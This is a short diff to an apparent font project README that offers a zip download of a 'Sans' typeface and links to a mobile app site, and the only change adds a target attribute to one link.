@@ -1,6 +1,6 @@
 # Sans FONT Typeface (3 fonts)
 <b>Welcome!</b> <br>
-This is my fresh take on <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font🡇</a> typeset.   mobile App project: <a href="https://bowHip.org">bowHip.org</a><br>
+This is my fresh take on <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font🡇</a> typeset.   mobile App project: <a target="_blank" href="https://bowHip.org">bowHip.org</a><br>
 
 Sans Typeface — plus 2 bonus fonts.<br>
   Fonts simular to this include:  Sego | Source Sans Pro | Open Sans<br><br>
